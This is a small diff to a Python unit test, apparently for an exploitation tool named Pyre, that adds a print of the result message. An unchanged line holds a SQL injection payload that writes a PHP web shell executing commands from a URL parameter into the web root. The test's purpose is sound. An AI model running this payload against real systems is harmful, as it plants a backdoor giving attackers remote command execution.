@@ -13,7 +13,7 @@ class TestPyre(unittest.TestCase):
                 "id": "-1 UNION SELECT 1,2,3,4,5,6,7,'<?php system(\\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/tester.php' -- -"
             }
         )
-
+        print(result.message)
         self.assertTrue(result.success, msg=result.message)
 
 
